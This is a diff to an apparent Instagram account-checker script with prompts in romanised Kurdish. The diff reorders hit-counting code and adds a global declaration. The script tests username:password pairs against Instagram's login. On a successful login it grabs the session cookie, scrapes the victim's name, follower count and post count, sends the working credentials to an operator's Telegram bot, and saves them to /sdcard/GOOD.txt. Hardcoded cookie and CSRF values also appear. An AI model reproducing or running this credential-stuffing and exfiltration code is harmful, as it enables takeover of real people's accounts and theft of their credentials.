@@ -70,6 +70,7 @@ ID=input(" \n ID Chat y Telegram y Xot Dabne :")
 print(" \n Agar Nazani Token y BOT Beni  \n  Bnwsa @botfather Lawe Dary Bena ")
 token=input(" \n Token ( BOT ) : ")
 def lwla():
+	global ID, token
 	wd = "\033[90;1m" 
 	GL = "\033[96;1m"
 	BB = "\033[34;1m"
@@ -147,9 +148,6 @@ def lwla():
 				elif 'userId' or '"authenticated":true' in login.text:
 					os.system(oss)
 					print(logo2)
-					hits+=1
-					tesed=(bad)+(hits)+(checkpoint)
-					print(f' '+W+' '+W+'['+wd+'T'+W+']'+wd+'otal'+W+' : '+wd+'12501\n    '+W+'['+wd+'^'+W+'] '+wd+'Tested '+W+': '+wd+str(tesed)+W+'\n    ['+G+'+'+W+']'+G+' Good '+W+':'+G+' '+str(hits)+' \n '+W+'   ['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'   ['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'   ['+Y+'='+W+'] '+Y+'timeout '+W+': '+str(timeout)+' \n'+W+'    ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'   ['+R+'-'+W+']'+R+' Kill'+W+' :'+R+' '+str(kill)+'\n'+W+'\n -------------------------------------------\n',end='')
 					cook = login.cookies['sessionid']
 					hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/_papulakam__0/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': str(useragent),'x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest'}
 					data_get_info = {'__a': '1'}
@@ -172,6 +170,9 @@ def lwla():
 					posts = description["content"].split(",")[2].split("-")[0]
 					name = str(req_get_info.json()['form_data']['first_name'])
 					boooom=("GOOD: "+user+":"+pasw+"\nName: "+name+"\nFollowers: "+followers+"\nfollowing: "+following+"\nPost: "+posts)
+					hits+=1
+					tesed=(bad)+(hits)+(checkpoint)
+					print(f' '+W+' '+W+'['+wd+'T'+W+']'+wd+'otal'+W+' : '+wd+'12501\n    '+W+'['+wd+'^'+W+'] '+wd+'Tested '+W+': '+wd+str(tesed)+W+'\n    ['+G+'+'+W+']'+G+' Good '+W+':'+G+' '+str(hits)+' \n '+W+'   ['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'   ['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'   ['+Y+'='+W+'] '+Y+'timeout '+W+': '+str(timeout)+' \n'+W+'    ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'   ['+R+'-'+W+']'+R+' Kill'+W+' :'+R+' '+str(kill)+'\n'+W+'\n -------------------------------------------\n',end='')
 					requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
 					if os.name=="posix":
 						with open('/sdcard/GOOD.txt', 'a') as ff:
@@ -243,9 +244,6 @@ def lwla():
 				elif 'userId' or '"authenticated":true' in login.text:
 					os.system(oss)
 					print(logo2)
-					hits+=1
-					tesed=(bad)+(hits)+(checkpoint)
-					print(f' '+W+' '+W+'['+wd+'T'+W+']'+wd+'otal'+W+' : '+wd+'12501\n    '+W+'['+wd+'^'+W+'] '+wd+'Tested '+W+': '+wd+str(tesed)+W+'\n    ['+G+'+'+W+']'+G+' Good '+W+':'+G+' '+str(hits)+' \n '+W+'   ['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'   ['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'   ['+Y+'='+W+'] '+Y+'timeout '+W+': '+str(timeout)+' \n'+W+'    ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'   ['+R+'-'+W+']'+R+' Kill'+W+' :'+R+' '+str(kill)+'\n'+W+'\n -------------------------------------------\n',end='')
 					cook = login.cookies['sessionid']
 					hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/_papulakam__0/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': str(useragent),'x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest'}
 					data_get_info = {'__a': '1'}
@@ -268,6 +266,9 @@ def lwla():
 					posts = description["content"].split(",")[2].split("-")[0]
 					name = str(req_get_info.json()['form_data']['first_name'])
 					boooom=("GOOD: "+user+":"+pasw+"\nName: "+name+"\nFollowers: "+followers+"\nfollowing: "+following+"\nPost: "+posts)
+					hits+=1
+					tesed=(bad)+(hits)+(checkpoint)
+					print(f' '+W+' '+W+'['+wd+'T'+W+']'+wd+'otal'+W+' : '+wd+'12501\n    '+W+'['+wd+'^'+W+'] '+wd+'Tested '+W+': '+wd+str(tesed)+W+'\n    ['+G+'+'+W+']'+G+' Good '+W+':'+G+' '+str(hits)+' \n '+W+'   ['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'   ['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'   ['+Y+'='+W+'] '+Y+'timeout '+W+': '+str(timeout)+' \n'+W+'    ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'   ['+R+'-'+W+']'+R+' Kill'+W+' :'+R+' '+str(kill)+'\n'+W+'\n -------------------------------------------\n',end='')
 					requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
 					if os.name=="posix":
 						with open('/sdcard/GOOD.txt', 'a') as ff:
